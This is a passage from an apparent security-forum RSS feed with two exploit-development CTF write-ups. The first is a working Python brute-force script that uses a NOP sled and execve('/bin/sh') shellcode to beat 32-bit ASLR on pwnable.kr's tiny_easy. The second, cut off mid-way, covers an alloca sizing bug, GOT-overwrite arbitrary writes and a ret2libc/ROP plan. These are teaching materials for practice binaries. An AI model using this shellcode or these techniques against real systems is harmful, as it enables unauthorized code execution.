}

</code></pre>
<p>We compile and run it and get the following result:</p>
<p><strong><img src="/uploads/default/original/2X/d/da97410ec0a3167b099e893ad1a6910965f3fe75.png" alt="" data-base62-sha1="vbK9eUlJr2ajvFwUYMWQr5aBI4R" width="434" height="87"></strong></p>
<p>Let’s use pwnlib to manipulate the argv[0] to our own string</p>
<pre><code class="lang-auto">
from pwnlib.tubes.process import * 

argv_program=process(argv=["awdawd"], executable="/home/user/test_argv")

print argv_program.recv()

</code></pre>
<p>Now lets run our python program and see what result we received from the test_argv program:</p>
<p><strong><img src="/uploads/default/original/2X/2/2c8474e29da91c1ad841a3bfa87a9e819ba3b884.png" alt="" data-base62-sha1="6lONkmt7V095qYoPkcF76WCikQc" width="391" height="67"></strong></p>
<p>Great!</p>
<p>We now know how to have control over argv0, this means we can jump anywhere we want in the tiny_easy binary.</p>
<p>Our next step is checking what mitigations does this binary have.</p>
<p>Let’s run <a href="https://github.com/slimm609/checksec.sh" rel="noopener nofollow ugc">checksec</a> and see.</p>
<p><strong><img src="/uploads/default/original/2X/a/a8a74cd88de9588f8a594cc0b297d145165f0182.png" alt="" data-base62-sha1="o3YEy2tbw1i52WlZyUVWSqrGfM6" width="590" height="131"></strong></p>
<p><strong>RELRO</strong>: No RELRO - no RELRO protection here  - Not relevant</p>
<p><strong>Stack</strong>: No stack canary is found here. Not relevant here but cool</p>
<p><strong>NX:</strong> NX disabled -  non executable protections is disabled, jackpot!</p>
<p>**PIE: **the code is not position independent - not relevant</p>
<p><strong>Note</strong>: By default, ASLR is enabled at stack level</p>
<p>NX protection is a protection which doesn’t allow us to run code only in the code sections of a binary. This means that we can’t jump to code on the stack or heap and run them.</p>
<p>In this example, we can see this binary is compiled without this protection which means we can possibly jump to our code on the stack.</p>
<p>I need to stress this out: <strong>checking for these kinds of protections straight in the beginning will save you a lot of time and frustration.</strong></p>
<p>In this example, because we can’t control the return address and NX is disabled then our best bet is to concentrate our effort of finding a way to jump to the stack and execute our shellcode that is stored in one of our parameters.</p>
<p>If on the other hand, NX was enabled then this means that we couldn’t jump to the stack and we needed to find a different way to run our code (ROP Gadgets, ret2libc, and many other methods)</p>
<p>Now that we can control where we can jump,we need to deal with the fact that ASLR is enabled at the stack level.</p>
<p>Let’s try to find an instruction that can allow us to jmp to the stack and thus run our shellcode.</p>
<p>The rest of the bytes in the program are part of the elf header</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc.png" data-download-href="/uploads/short-url/iHNk5STkr9zeVCzOsL1ZAEFkDZa.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc_2_602x432.png" alt="" data-base62-sha1="iHNk5STkr9zeVCzOsL1ZAEFkDZa" width="602" height="432" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc_2_602x432.png, /uploads/default/original/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc.png 1.5x, /uploads/default/original/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc_2_10x10.png"></a></strong></div><p></p>
<p>We can also view these bytes an instructions in IDA using the “C” hotkey</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4.png" data-download-href="/uploads/short-url/8UcuIBPkv8V5LeJDAKS3KGnu3vm.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4_2_602x427.png" alt="" data-base62-sha1="8UcuIBPkv8V5LeJDAKS3KGnu3vm" width="602" height="427" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4_2_602x427.png, /uploads/default/original/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4.png 1.5x, /uploads/default/original/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4_2_10x10.png"></a></strong></div><p></p>
<p>Our best bet for an instruction to jump to is “jmp esp”</p>
<p>This will jump to the stack and from there we may be able to get to our shellcode that is stored in one of the parameters.</p>
<p>I like to perform my searches by hand <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> so i used <a href="https://defuse.ca/online-x86-assembler.htm" rel="noopener nofollow ugc">online disassembling</a> to find what opcodes make up the jmp esp instruction.</p>
<p>If we try to disassemble jmp esp we get:</p>
<p>ff e3</p>
<p>Lets try to search this bytes in IDA using the search-&gt;sequence of bytes</p>
<p>And put in ff e3</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40.png" data-download-href="/uploads/short-url/hGsHQhN0xpyGKFHNXT62ZTI9SiQ.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40_2_602x145.png" alt="" data-base62-sha1="hGsHQhN0xpyGKFHNXT62ZTI9SiQ" width="602" height="145" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40_2_602x145.png, /uploads/default/original/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40.png 1.5x, /uploads/default/original/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40_2_10x10.png"></a></strong></div><p></p>
<p>No result <img src="https://0x00sec.org/images/emoji/twitter/frowning.png?v=9" title=":frowning:" class="emoji" alt=":frowning:"></p>
<p>I tried searching for the bytes for call esp and didn’t find anything!</p>
<p>Now this is an interesting situation.</p>
<p>We want to jump to our code on the stack but we don’t know the address to jump to because of ASLR.</p>
<p>We tried to find an instruction that allows us to jmp to the stack without knowing it’s address but we didn’t find any.</p>
<p><strong>Another quick idea i tried:</strong></p>
<p>Jmp to an instruction that will allow you to write bytes to code section.</p>
<p>You can use this method to overwrite one of the instructions with the jmp esp opcodes to one of the addresses and then perform a jump to the instruction’s address.</p>
<p>It’s basically like driving a train that builds its tracks while it’s going and i liked the idea of this.</p>
<p>Unfortunately, i checked out the segment permissions to see what are the section permission using view-&gt;Open subviews-&gt;segments and found our the following</p>
<p><strong><img src="/uploads/default/original/2X/a/a86b067c22b1d8012685085d700560d06bed8fea.png" alt="" data-base62-sha1="o1TvYxTYUqcHwrekUpt58tP20ga" width="506" height="45"></strong></p>
<p>Only the R and X permissions are enabled for the code section</p>
<p>R - read permissions</p>
<p>X - execute permissions</p>
<p>The W (write) permission is disabled.</p>
<p>This means that if we attempt to rewrite an instruction in the code section, we will receive a segfault and the program will crash.</p>
<p>I banged my head on this program for a couple of hours, trying different methods of jumping to instructions but i couldn’t find a way to get to the stack successfully.</p>
<p>What shall a young exploiter do next?</p>
<h2>ASLR in 32-bit</h2>
<p>I started reading about ASLR implementation on 32bit systems (remember, our binary is 32-bit )</p>
<p>And i found the following explanation:</p>
<p>“For 32-bit, there are 2^32 (4 294 967 296) theoretical addresses, nevertheless, the kernel will allow to control about only half of bits (2^(32/2) = 65 536) for an execution in a virtualized memory”.</p>
<p>This means that the stack size can randomized just up to 65,536 bytes.</p>
<p>If we can can control tens of thousands of shellcode bytes then we might can try to jmp to a constant address on the stack and have a good probability of success</p>
<p>I checked whether it was possible to send lots of parameters with long strings</p>
<pre><code class="lang-auto">
from pwnlib.tubes.process import *

for i in range(600):


    argv.append("a"*1024)

argv_program=process(argv=["awdawd"], executable="/home/user/test_argv")

print argv_program.recv()

</code></pre>
<p><strong><img src="/uploads/default/original/2X/2/22a128d23236a26d19c88a5f4610a20f0462c6c3.png" alt="" data-base62-sha1="4Wlw1zZoYEmcSc7Nalkrqk4sVJp" width="384" height="75"></strong></p>
<p>We sent in this example, 6014400 bytes to our program and run succesfully</p>
<p>Let’s make a slide!</p>
<p>A NOP slide !</p>
<p><strong><img src="/uploads/default/original/2X/e/e6f58b5d79ff8ac4a567058cb634b591c23aafc1.png" alt="" data-base62-sha1="wX9Tt0Bhnbz1bvRzt4cxwKDzQsh" width="404" height="358"></strong></p>
<p>We can send our parameters filled with nops and our shellcode at the end.</p>
<p>That way, we can jump to a random address on the stack and hopefully we will be able to land on one of our nop instructions and we will slide the whole way to our shellcode.</p>
<p>I made the following code that executes the program</p>
<p>With our payload and attempts to jump to a constant address on the stack</p>
<p>0xffb05544</p>
<p>This address was chosen for both reasons:</p>
<p>1.In this program i noticed after many executions with gdb that this address is most of the time in the range of the stack or very close to it</p>
<p>2.we needed an address without any null bytes in it because otherwise we would get</p>
<p>An the following error:</p>
<p>“Inappropriate nulls in argv[0]:”</p>
<p>So i wrote the following code:</p>
<pre><code class="lang-auto">
import struct

import random

from pwnlib.tubes.process import *

from pwnlib.exception import *

import pwnlib

# Taken from http://shell-storm.org/shellcode/files/shellcode-811.php

# execve('/bin/sh')

EXECV = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

def build_shellcode(address):


    """


    Build shellcode


    address - address to jump to


    """ 


    args = []


    args.append(address)


    shellcode =   "\x90"*8000 + EXECV


    for i in range(120):


        args.append(shellcode)


    return args


     

if __name__ == "__main__":


    jump_address = struct.pack("I", 0xffb05544)


    for i in range(10000000):


        try:


            prog_args = build_shellcode(jump_address)


            	print "attempt number: {}".format(i + 1 )


            pro = process(argv=prog_args,


                env={}, 


                executable="/home/user/CTFs/Pwnables/tiny_easy/tiny_easy")


            print "started_running address {}".format(hex(struct.unpack("I",jump_address)[0]))


            pro.timeout=0.08


            # Send command shell of the process


            pro.sendline("echo we_made_it!")


            # Recv the result of the command execution  


            data = pro.recvline()


            if data:


                print "received data!"


                print data


                break


        except (EOFError, pwnlib.exception.PwnlibException) as e:


            print e

</code></pre>
<p>This code attempts to run the tiny_easy binary and jump to our shellcode which opens a shell. If we succeed then we will be able to send the command</p>
<p>“echo we_made_it” and see it’s output</p>
<p>Lets try it out</p>
<p><strong><img src="/uploads/default/original/2X/d/dc9b1caaab4aa0f2117f8865a88a825cd17096f6.png" alt="" data-base62-sha1="vtzmTTY7FVvmiioDyW7Abcy2buS" width="486" height="215"></strong></p>
<p><strong><img src="/uploads/default/original/2X/d/dc9b1caaab4aa0f2117f8865a88a825cd17096f6.png" alt="" data-base62-sha1="vtzmTTY7FVvmiioDyW7Abcy2buS" width="486" height="215"></strong></p>
<p>It worked!</p>
<p>It seems that our nop slide did it’s job successfully, now let’s check it out on the CTF server itself.</p>
<p>Notice that we need to change the command we wish to execute from</p>
<p>“echo we_made_it” to “cat /home/tiny_easy/flag” In order to get the flag.</p>
<p>We can upload our script to the server’s tmp directory easily using the “scp” command like this:</p>
<pre><code class="lang-auto">
scp -P 2222 ./pwn_tiny.py tiny_easy@pwnable.kr:/tmp/pwn_tiny.py

</code></pre>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485.png" data-download-href="/uploads/short-url/ukXhf8Iewj9bcpFdw0ZeifpxzZb.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485_2_372x499.png" alt="" data-base62-sha1="ukXhf8Iewj9bcpFdw0ZeifpxzZb" width="372" height="499" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485_2_372x499.png, /uploads/default/original/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485.png 1.5x, /uploads/default/original/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d49fa71954f631a874e8d9b2756c8fb91b580485_2_10x10.png"></a></strong></div><p></p>
<p>And there is our flag <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<hr>
<h1>Conclusions</h1>
<p>In this article, we discussed exploit development by using a CTF example,<br>
we learned about how inputs are received by the program from argv and argc.<br>
Finally, saw how ASLR in 32-bit systems is vulnerable due to small randomization ranges and how to utilize this flaw to perform an attack that is statistically very plausible.</p>
<p>I hope you all enjoyed my first post and i’ll see you all next time!</p>
<p><strong>Sources</strong></p>
<p><strong><a href="https://hacked0x90.wordpress.com/2016/10/30/bypassing-aslr-protection-using-brute-force/" rel="noopener nofollow ugc">Bypassing ASLR Protection using Brute Force</a></strong></p>
<p><strong><a href="https://pwnable.kr/" rel="noopener nofollow ugc">Pwnable.kr</a></strong></p>
            <p><small>10 posts - 8 participants</small></p>
            <p><a href="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349</link>
          <pubDate>Wed, 08 Apr 2020 13:01:42 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20349</guid>
          <source url="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349.rss">Exploit Development - The Magic in Hacking</source>
        </item>
        <item>
          <title>Punishing code with magic numbers with ROP and ret2libc on an x86_64</title>
          <dc:creator><![CDATA[GnikDroy]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h1>Punishing code with magic numbers with ROP and ret2libc on an x86_64</h1>
<p><strong>Difficulty: Beginner</strong></p>
<p><strong>CTF: /zer0pts/pwn/protude</strong> (ASLR is enabled here)</p>
<h2>The vulnerable program</h2>
<p>This program takes an integer <code>N</code> and <code>N</code> other integers as input. Then it calculates and prints the sum of these numbers.<br>
A pretty standard exercise when you are learning a new programming language.</p>
<p>We are going to attempt to exploit it get RCE. Take a few moments to absorb the code before moving on.</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

long n;

long read_long() {
  char buf[32];
  int readByte;
  memset(buf, 0, sizeof(buf));          // sets memory to 0
  readByte = read(0, buf, sizeof(buf)); // reads 32 bytes of input
  if (readByte == 0) {
    puts("[ERROR] read failed");        // no bytes read = exit()
    exit(1);
  }
  return atol(buf);                     // convert input to long
}

void setup() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
}

void calc_sum(void) {
  long i;
  long *array;
  long result;
  
  array = (long*)alloca(n * 4);       

  for(i = 0; 0 &lt;= i &amp;&amp; i &lt; n; i++) {
    printf("num[%ld] = ", i + 1);
    array[i] = read_long();
  }

  for(result = 0, i = 0; i &lt; n; i++) {
    result += array[i];
  }

  printf("SUM = %ld\n", result);
}

int main() {
  setup();
    
  printf("n = ");
  n = read_long();
  if (n &lt;= 0x00 || n &gt; 22) { // size has to be 1-22
    puts("Invalid input");
  } else {
    calc_sum();
  }
  return 0;
}
</code></pre>
<h2>Setup</h2>
<p>Let’s set up a few things before we start:</p>
<ul>
<li>Disable ASLR<pre><code class="lang-bash">echo 0 &gt; /proc/sys/kernel/randomize_va_space
</code></pre>
</li>
<li>Disable PIE (during compilation)</li>
<li>Enable DEP (during compilation)</li>
<li>Enable stack protector (during compilation)</li>
</ul>
<p>The binary is provided to you <a href="http://s000.tinyupload.com/index.php?file_id=45318469853655576559" rel="nofollow noopener">here</a>.</p>
<h2>Static Analysis</h2>
<h3>Inspecting code that handles user input.</h3>
<p>Let’s take a closer look at the user input function.</p>
<pre><code class="lang-auto">long read_long() {
  char buf[32];
  int readByte;
  memset(buf, 0, sizeof(buf));          // sets memory to 0
  readByte = read(0, buf, sizeof(buf)); // reads 32 bytes of input
  if (readByte == 0) {
    puts("[ERROR] read failed");        // no bytes read = exit()
    exit(1);
  }
  return atol(buf);                     // convert input to long
}
</code></pre>
<p>We have a buffer of 32 bytes. <code>read(0, buf, sizeof(buf))</code> reads <strong>at most</strong> 32 characters. Therefore, there is <strong>no way to overwrite the stack using read.</strong> : (</p>
<p>We have an interesting call to <code>atol(buf)</code> at the end, but we cannot get anything out of it. The function will simply return <code>0</code> on any suspicious input.</p>
<p>Although the function implementation uses bad practices, we don’t have anything interesting going on.</p>
<h3>Inspecting the function that calculates the sum.</h3>
<pre><code class="lang-auto">void calc_sum(void) {
  long i;
  long *array;
  long result;
  
  array = (long*)alloca(n * 4);       

  for(i = 0; 0 &lt;= i &amp;&amp; i &lt; n; i++) {
    printf("num[%ld] = ", i + 1);
    array[i] = read_long();
  }

  for(result = 0, i = 0; i &lt; n; i++) {
    result += array[i];
  }

  printf("SUM = %ld\n", result);
}

</code></pre>
<p>If you are unfamiliar with <code>alloca</code>, <code>man 3 alloca</code> to check the manual page for it.</p>
<blockquote>
<p>The alloca()  function allocates size bytes of space in the stack frame of the caller.  This temporary space  is  automatically  freed  when the function that called alloca() returns to its caller</p>
</blockquote>
<p><code>alloca</code> allocates memory <strong>in the stack frame of the caller</strong>, in this case, <code>calc_sum</code>.</p>
<p><strong>This is an interesting choice.</strong> Usually, people use <code>malloc</code> to allocate space at runtime. But in this case, since <code>n</code> is bound to 1-22, it is not too bad. Too much stack space is <strong>not</strong> used.</p>
<p>Then, N integers that are read from <code>read_long()</code> are placed in the memory we allocated.<br>
The sum is calculated and the result is printed. Not too much going here as well.</p>
<p><strong>If you want to figure out the vulnerability on your own, stop here.</strong></p>
<h2>Introducing magic numbers</h2>
<blockquote>
<p>The term <a href="https://en.wikipedia.org/wiki/Magic_number_(programming)" rel="nofollow noopener">magic number</a> or magic constant refers to the anti-pattern of using numbers directly in source code</p>
</blockquote>
<p>The use of magic numbers is often frowned upon. They make your code difficult to understand and often introduce subtle bugs.</p>
<p>Take a look at the following piece of code from Wikipedia.</p>
<pre><code class="lang-auto">   for i from 1 to 52
       j := i + randomInt(53 - i) - 1
       a.swapEntries(i, j)
</code></pre>
<p>52 and 53 (and most other numbers which has no meaning in local context) is a magic number.<br>
In this above case, the only problem this poses is a slight annoyance over the mysterious 52. Cases like the following, however, may create portability issues.</p>
<pre><code class="lang-auto">const int array_size = 20;
int *ptr = (int*) malloc(array_size * 4);
</code></pre>
<p>Here, 4 is the magic number. The peice of code above executes properly in systems where the <code>sizeof (int) == 4</code>. But if it is 2, it breaks miserably when we attempt to use <code>ptr</code>.</p>
<p>If we were to write this properly, we would use something like.</p>
<pre><code class="lang-auto">const int array_size = 20;
int *ptr = (int*) malloc(array_size * sizeof (int));
</code></pre>
<p>Okay, now you are equipped with the knowledge of magic numbers! Let us approach this problem again.</p>
<h2>Finding an arbitrary write.</h2>
<p>Take a look at:</p>
<pre><code class="lang-auto">  array = (long*) alloca(n * 4);       
</code></pre>
<p>This is the exact portability issue that we discussed earlier.<br>
Only <code>sizeof(char)</code> is fixed as 1 by the C standard. Everything else usually only has minimum size requirements. The compiler can choose whatever size it sees is the best.<br>
Usually, in x86_64 compilers make the <code>sizeof(long) == 8</code>. This is convenient because a <code>long</code> will fit in a register.</p>
<p><strong>In this case, sizeof(long) == 8</strong></p>
<p>So we have allocated space like <code>alloca(n * 4);</code> yet the <code>sizeof(long) == 8</code> (In x86_64, this is usually the case).</p>
<p>Therefore, we are only allocating enough memory for <code>n/2</code> longs. Yet, we access all <code>n</code> of them. We are accessing memory not allocated for us! Also, <strong>we can write to that memory.</strong></p>
<p>Even more convenient is the fact that <code>alloca</code>  was used. The extra memory we are addressing is on the stack.</p>
<p>The stack frame will usually look like this for the <code>calc_sum</code> function.</p>
<pre><code class="lang-auto">-----------------------------------------
|      Arguments to the function        |
-----------------------------------------
|           Return Address              |
-----------------------------------------
|      Local variables of calc_sum      |
-----------------------------------------
|          Alloca(n*4) buffer           |
-----------------------------------------
</code></pre>
<p>We can potentially overwrite the local variable <code>array</code> to achieve arbitrary write!</p>
<h2>Exploiting the arbitrary write once.</h2>
<p>Let’s fire up gdb:</p>
<pre><code class="lang-auto">gdb-peda$ r
n = 21
num[1] = 
num[2] = 
num[3] = 
num[4] = 
... 
num[15] = 
num[2] = 
</code></pre>
<p>We use n = 21. <em>Note that n is restricted to 1-22 (re-read the code if you are confused).</em></p>
<p>I just pass it empty strings so that <code>num[1]</code> through <code>num[15]</code> will be equal to 0.</p>
<p>We notice that after <code>num[15]</code>, we loop back to <code>num[2]</code>.<br>
We have overwritten the local variable <code>i</code>!</p>
<p>Since we have overwritten the local variable <code>i</code> with 0, we again start the loop from 2. (i++ is done at the end and printf() uses i+1).</p>
<p>We are looping indefinitely.</p>
<p>But, looping indefinitely is not useful to us.<br>
To write to memory beyond this, we override the <code>i</code> with 14 (exactly the current index).<br>
So that in the next iteration we get to <code>num[16]</code>.</p>
<pre><code class="lang-auto">gdb-peda$ r
n = 21
num[1] = 
...
num[15] = 14
num[16] = 
</code></pre>
<p>We can now write past the limit and override <code>*array</code> in the next iteration! Then write to <code>*(array+n)</code> in the iteration after that!. That means since we control <code>array</code> we can write to anywhere we wish.</p>
<p>Let’s try to override the <code>printf</code>'s <a href="https://en.wikipedia.org/wiki/Global_Offset_Table" rel="nofollow noopener">GOT</a> entry to point to the <code>puts()</code> call in the code to test things.</p>
<p>First, we get the GOT entry of <code>printf</code>.</p>
<pre><code class="lang-auto">gdb-peda$ x/i printf
   0x400690 &lt;printf@plt&gt;:
    jmp    QWORD PTR [rip+0x20099a]        #0x601030

</code></pre>
<p><code>0x601030</code> is the GOT offset of printf</p>
<p>We then get the location where the <code>puts</code> call is made.</p>
<pre><code class="lang-auto">gdb-peda$ disass read_long
Dump of assembler code for function read_long:
   0x00000000004007c7 &lt;+0&gt;:     push   rbp
   0x00000000004007c8 &lt;+1&gt;:     mov    rbp,rsp
   ...
   0x0000000000400813 &lt;+76&gt;:    lea    rdi,[rip+0x28a]        # 0x400aa4
   0x000000000040081a &lt;+83&gt;:    call   0x400660 &lt;puts@plt&gt;
   ...
   End of assembler dump.
</code></pre>
<p><code>0x000000000040081a</code> is the place we want the GOT offset to point to.</p>
<p>So we override the value at <code>0x601030</code> with <code>0x000000000040081a</code></p>
<pre><code class="lang-auto">gdb-peda$ r
n = 21
num[1] =
...
num[15] = 14
num[16] = 
num[17] = 6295464
num[18] = 4196378
num[%ld] = 
[Inferior 1 (process 16567) exited with code 01]

</code></pre>
<p>As you can see, <code>num[%ld] = </code> was printed without formatting. Awesome.<br>
<code>printf@plt</code> jumped to <code>call puts@plt</code> (and the <code>call exit@plt</code> next).</p>
<p><strong>But wait a minute…</strong><br>
The careful reader might have noticed,<br>
<code>0x601030 = 6295600</code><br>
But we have used, <code>6295464</code> in gdb which is <code>0x601030 - 17*8</code></p>
<p><strong>Why so?</strong><br>
This is because in the next iteration we override the value at <code>array[17]</code> not <code>array[0]</code> therefore we correct the address by subtracting with <code>17 * sizeof(long)</code></p>
<p>With this, we have achieved arbitrary write!!</p>
<p>As of right now, we can only overwrite to memory once. But, it is still a step in the right direction.</p>
<h2>Overwriting to memory more than once.</h2>
<p>In order to overwrite to arbitrary memory more than once, we need to find a way to jump to the top of the <code>calc_sum()</code> function whenever we want.<br>
We will do this with a GOT entry overwrite.</p>
<p>Take a look at the following code from <code>read_long</code>.</p>
<pre><code class="lang-auto">  readByte = read(0, buf, sizeof(buf)); // reads 32 bytes of input
  if (readByte == 0) {
    puts("[ERROR] read failed");        // no bytes read = exit()
    exit(1);
  }
</code></pre>
<p>Bring up the man page of <code>read</code>: <code>man 2 read</code>.</p>
<blockquote>
<p>On success, the number of bytes read is  returned  (zero  indicates the end  of file)</p>
</blockquote>
<p>The if block only executes when we provide EOF to the input stream. If we overwrite either the <code>puts</code> or the <code>exit</code> GOT entry to point to the top of the <code>calc_sum</code> function, we can send an EOF to jump to the top of the function. This will allow us to overwrite regions of memory multiple times.</p>
<p>The relevant info:</p>
<pre><code class="lang-auto">calc_sum = 0x40088e = 4196494
puts@got = 0x601018 
</code></pre>
<p>Again, we need to overwrite the correct address so we correct the address <code>0x601018</code> so that <code>array[17]</code> will point to <code>0x601018</code></p>
<pre><code class="lang-auto">0x601018 - 17*8 = 6295440
</code></pre>
<pre><code class="lang-auto">gdb-peda$ r
n = 21
num[1] = 
...
num[15] = 14
num[16] = 
num[17] = 6295440
num[18] = 4196494
num[19] = num[1] = 
</code></pre>
<p>I used <code>CTRL + D</code> to send a EOF to the terminal. We can see the output <code>num[1]</code>. We jumped to the start of the <code>calc_sum</code> again!<br>
We can use this to overwrite to memory any number of times.</p>
<h2>ROP and ret2libc</h2>
<p>In this challenge, we have DEP and stack cookies that protect executing stack space and checking if the stack frame has been overwritten.</p>
<p>Most of the time, we <strong>do not have</strong> a space in a process that is both <strong>writable and executable</strong>.<br>
For instance let’s check for our current executable.</p>
<pre><code class="lang-auto">[gnik@tinybot ~/]$ ./thebinary &amp;
n =                                 
[gnik@tinybot ~/]$ ps aux | grep thebinary
gnik     16890  0.0  0.0  10696  1040 pts/1    t    16:01   0:00 /home/gnik/thebinary
[gnik@tinybot ~/]$ pmap 16890
16890:   /home/gnik/thebinary
0000000000400000      4K r-x-- thebinary
0000000000600000      4K r---- thebinary
0000000000601000      4K rw--- thebinary
00007ffff73ba000    104K r-x-- libpthread-2.27.so
00007ffff73d4000   2044K ----- libpthread-2.27.so
00007ffff75d3000      4K r---- libpthread-2.27.so
00007ffff75d4000      4K rw--- libpthread-2.27.so
00007ffff75d5000     16K rw---   [ anon ]
00007ffff75d9000     12K r-x-- libdl-2.27.so
00007ffff75dc000   2044K ----- libdl-2.27.so
00007ffff77db000      4K r---- libdl-2.27.so
00007ffff77dc000      4K rw--- libdl-2.27.so
00007ffff77dd000   1948K r-x-- libc-2.27.so
00007ffff79c4000   2048K ----- libc-2.27.so
00007ffff7bc4000     16K r---- libc-2.27.so
00007ffff7bc8000      8K rw--- libc-2.27.so
00007ffff7bca000     16K rw---   [ anon ]
00007ffff7bce000     24K r-x-- libgtk3-nocsd.so.0
00007ffff7bd4000   2044K ----- libgtk3-nocsd.so.0
00007ffff7dd3000      4K r---- libgtk3-nocsd.so.0
00007ffff7dd4000      4K rw--- libgtk3-nocsd.so.0
00007ffff7dd5000    156K r-x-- ld-2.27.so
00007ffff7fbe000     16K rw---   [ anon ]
00007ffff7ff7000     12K r----   [ anon ]
00007ffff7ffa000      8K r-x--   [ anon ]
00007ffff7ffc000      4K r---- ld-2.27.so
00007ffff7ffd000      4K rw--- ld-2.27.so
00007ffff7ffe000      4K rw---   [ anon ]
00007ffffffde000    132K rw---   [ stack ]
ffffffffff600000      4K r-x--   [ anon ]
 total            10700K

</code></pre>
<p>As you can see, <strong>none of them have both the write and execute bit set</strong>.</p>
<p>This is a pretty common security measure, so we cannot write shellcode to a certain memory region and jump to it.</p>
<p>This is where <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack" rel="nofollow noopener">ret2libc</a> and <a href="https://en.wikipedia.org/wiki/Return-oriented_programming" rel="nofollow noopener">ROP</a> come into play.</p>
<p>With <strong>ret2libc</strong> we are jumping to certain points in the libc library that is loaded at runtime. For instance, we can jump to potentially dangerous places like <code>system()</code> which is present in <code>libc</code>.</p>
<p>With <strong>ROP</strong> we jump to small code segments in the address space of the process that does a certain task before jumping to a different segment. Chaining a bunch of these ROP <em>gadgets</em> can hence be very powerful.</p>
<p>Our plan to achieve RCE is as follows:</p>
<ul>
<li>Find the address of system() in libc</li>
<li>Find the address of the string '/bin/sh/` lin libc</li>
<li>Find a ROP gadget that can place the address of the <code>/bin/sh</code> string in the rdi register.</li>
<li>Jump to system()</li>
</ul>
<p>Finding the address of system() and the string ‘/bin/sh’ is pretty straight forward.</p>
<pre><code class="lang-auto">gdb-peda$ start
....
Temporary breakpoint 1, 0x00000000004009bd in main ()
gdb-peda$ p system
$1 = {int (const char *)} 0x7ffff782c440 &lt;__libc_system&gt;
</code></pre>
<pre><code class="lang-auto">gdb-peda$ info proc map
process 17653
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      .......
      .......
      0x7ffff77dd000     0x7ffff79c4000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff79c4000     0x7ffff7bc4000   0x200000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7bc4000     0x7ffff7bc8000     0x4000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7bc8000     0x7ffff7bca000     0x2000   0x1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7bca000     0x7ffff7bce000     0x4000        0x0 
      0x7ffff7bce000     0x7ffff7bd4000     0x6000        0x0 /usr/lib/x86_64-linux-gnu/libgtk3-nocsd.so.0
      .......
      .......
gdb-peda$ find  '/bin/sh' 0x7ffff77dd000 0x7ffff79c4000
Searching for '/bin/sh' in range: 0x7ffff77dd000 - 0x7ffff79c4000
Found 1 results, display max 1 items:
libc : 0x7ffff7990e9a --&gt; 0x68732f6e69622f ('/bin/sh')
</code></pre>
